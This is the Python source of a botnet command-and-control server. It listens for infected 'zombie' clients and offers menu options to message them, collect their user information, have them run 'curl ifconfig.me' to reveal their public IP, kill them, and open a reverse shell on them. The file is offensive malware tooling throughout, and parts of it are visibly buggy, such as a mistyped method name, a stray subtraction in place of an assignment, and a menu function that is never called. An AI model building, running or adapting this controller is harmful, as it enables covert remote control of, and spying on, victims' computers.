import socket
import subprocess
import sys
import time
import threading
import asyncio
import io
import os
import psutil
import colorama
from colorama import Fore, Back, Style
exit_event=threading.Event()

def init_main_sock():
	while True:
		conn, addr = s.accept()
		print(Fore.GREEN, f'\n[*] Accepted connection from: {addr[0]}:{addr[1]})', Fore.WHITE)

		client_sock_handle = conn.filno()
		print(f"Client Socket Handle: {client_sock_handle}")
		global counter
		global automigrate
		counter+=1

		clientinfo = conn.recv(1024)
		clientinfo = clientinfo.decode('UTF-8')
		clientinfo - clientinfo.split("\n")


		UserInfo = clientinfo[0]
		clientlist.append([counter, conn, UserInfo])
		clientdata.append(clientinfo)

		handler_thread = threading.Thread(target=probe)
		handler_thread.daemon= True
		handler_thread.start()


def server_selection():
	global clientlist
	commands="True"

	while not "exit" in commands:

		command=input(Fore.CYAN+ "<< elevate >>" + Fore.WHITE)
		if command=="":
			pass
		if command =="zombies":
			zombies()
		if command == "cls" or command == "clear":
			if os.name=='nt':
				os.system('cls')

			else:
				os.system('clear')
		if command =="?" or command == "help":
			print(Fore.YELLOW + "commands:\n$ zombies\n$ clear\n$ clear/cls \n$ CTRL + C  terminates server\n" + Fore.WHITE)

def startrevshellsvr():
	if os.name == 'nt':
		subprocess.call(["py", "pyrevshell_server.py"])
		exit_event.set()
	else:
		subprocess.call(["python3", "pythonshell_server.py"])
		exit_event.set()


def probe():
	while True:
		global counter
		global clientlist
		global clientdata

		try:
			d = 0
			for c in range(len(clientlist)):
				clientlist[c][1].send(b"?Wish to let them live? \n")
				d+=1
		except:
			print(Fore.YELLOW + "\n This zombie died: \n ***********************************************\n"+ Fore.WHITE, counter, "--->", clientdata[d], "\n***********************************************\n")
			clientlist.pop(d)
			clientdata.pop(d)

			counter-=1
			print(Fore.GREEN + "[+] removed \"dead\" fuck that zombie" + Fore.WHITE)
		time.sleep(4)


def zombies():
	global counter
	global clientlist
	global clientdata
	selection=""

	if (len(clientlist)) <= 0:
		print(Fore.RED + "[!]No deadbodies to turn into zombies yet...." + Fore.WHITE)
		return

	print(Fore.GREEN + "Zombies : ", len(clientlist), Fore.WHITE)

	temp = 0
	for b in clientdata:
		print("Zombie: ", temp, "--->", b)
		temp+=1
	print(Fore.GREEN + "\n Pick a zombie to interact with! \n"+ Fore.WHITE)
	try:
		selection = int(input('<enter the client#> $'))
	except:
		print(Fore.RED + "[!] enter client number..."+ Fore.WHITE)
		time.sleep(2)
		return

	while True:
		if os.name == 'nt':
			os.system("cls")
		else:
			os.system("clear")
		print(Fore.GREEN)
		print("What would Your Highness Like to do ?")
		print("1.Send a Message to your workers") # send a message
		print("2. Get Information of Inhabitants") # get user info
		print("3. Get the exact location of the Inhabitant") # get public ip
		print("4. Kill a Zombie in your control") # kill a zombie
		print("5. Launch into their minds") # start a shell
		print("6. Find out more about yourself") # whoami



		print("15. Main menu")
		print(Fore.WHITE)
		try:
			choice = input(Fore.YELLOW + "[Select a number]: $"+ Fore.WHITE)
		except:
			print(Fore.RED + "[!] enter a number..."+ Fore.WHITE)
			time.sleep(2)
			return

		if choice =="1":
			try:
				clientlist[selection][1].send(b":msg:\nI bring thee a message from our Highness\n")
				print(Fore.GREEN + "[+] Message Sent!" + Fore.WHITE)
				time.sleep(2)
			except:
				print(Fore.RED + "[!] Message not sent" + Fore.WHITE)
				time.sleep(2)
		if choice == "2":
			for a in clientdata[selection]:
				print(a)
			input()
		if choice == "3":
			try:
				clientlist[selection][1].send(b"c0mm@nd\ncurl ifconfig.me\n")
				print(Fore.GREEN + "{+} Public IP sent!" + Fore.WHITE)
				pubip=clientlist[selection][1].recv(1024)
				pubip = pubip.decode('UTF-8')
				print(pubip)
				input("press any key..")
			except:
				print(Fore.RED + "[!] there was an error sending the command" + Fore.WHITE)
				time.sleep(2)

		if choice == "4":
			try:
				clientlist[selection][1].send(b"self-destruct\n")
				print(Fore.GREEN + "[+] Zombie terminated" + Fore.WHITE)
				time.sleep(2)
				return
			except:
				print(Fore.RED + "[!] Zombie not terminated" + Fore.WHITE)
				time.sleep(2)
		if choice == "5":
			exit_event.clear()

			handler_thread = threading.Thread(target=startrevshellsvr)
			handler_thread.daemon = True
			handler_thread.start()

			print("[+] Launching into their brain now!")
			time.sleep(2)

			clientlist[selection][1].send(b":shell:\n")

			while not exit_event.is_set():
				time.sleep(1)
			return
		if choice == "6":
			clientlist[selection][1].send(b":whomai:\n")
			whoami = clientlist[selection][1].recv(1024)
			whoami = whoami.decode('UTF-8')
			print("You are :", whoami)
			time.sleep(2)

		if choice == "15":
			return

counter=-1
clientlist=[]
clientdata=[]
automigrate=""

host="0.0.0.0"
port= 4545

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host,port))
s.listen(5)
print(Fore.YELLOW + "[+] listening on port" + str(port), Fore.WHITE)

handler_thread = threading.Thread(target=init_main_sock)
handler_thread.daemon = True
handler_thread.start()

while True:
	time.sleep(1)


